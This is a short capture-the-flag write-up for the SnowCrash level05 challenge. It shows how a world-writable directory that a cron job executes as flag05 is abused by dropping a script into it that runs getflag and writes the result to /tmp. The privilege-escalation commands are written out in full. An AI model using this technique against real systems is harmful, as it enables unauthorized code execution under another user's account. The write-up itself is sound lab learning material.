Loggin in we have this message: 'You have new mail.'

We start by checking for mail and find a cron job running under the `flag05` user.

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This cron job executes a script every 2 minutes as `flag05`, running `sh /usr/sbin/openarenaserver`.

Inspecting `/usr/sbin/openarenaserver` shows:

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script runs all executable files in `/opt/openarenaserver/`, then removes them. Since it’s a cron job, it doesn’t output to standard output, so we need a redirect to capture the result.

We create a script that runs `getflag` and redirects the output to `/tmp/test`:

```
level05@SnowCrash:~$ echo "getflag > /tmp/test" > /opt/openarenaserver/test.sh
```

After a short wait, we check if the file has been removed, confirming the cron job has run:

```
level05@SnowCrash:~$ ls /opt/openarenaserver/
```

The file is gone, indicating the cron job executed it.

We check `/tmp/test` to retrieve the flag:

```
level05@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token :
```

Success!
